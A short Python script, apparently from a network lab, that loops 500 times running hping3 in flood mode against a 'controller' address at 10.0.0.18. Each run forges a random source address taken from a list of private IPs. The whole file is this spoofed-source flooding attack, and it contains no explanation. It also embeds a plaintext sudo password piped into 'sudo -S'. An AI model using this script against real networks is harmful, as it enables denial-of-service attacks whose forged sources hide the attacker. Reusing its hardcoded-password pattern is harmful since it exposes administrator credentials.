import os
import random as rm

call_size = 500
packages = "20"
data_size = "120"
controller_ip = "10.0.0.18"
ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5", "10.0.0.6", "10.0.0.8", "10.0.0.42", "10.0.0.43",
       "10.0.0.44"]
sudoPassword = 'pmthtsfk'

for x in range(0, call_size):
    position = rm.randint(0, 9)
    ip = ips[position]
    os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --flood -c " + packages + " -p 7 " + "-d " + data_size + " -a " + ip + " " + controller_ip))
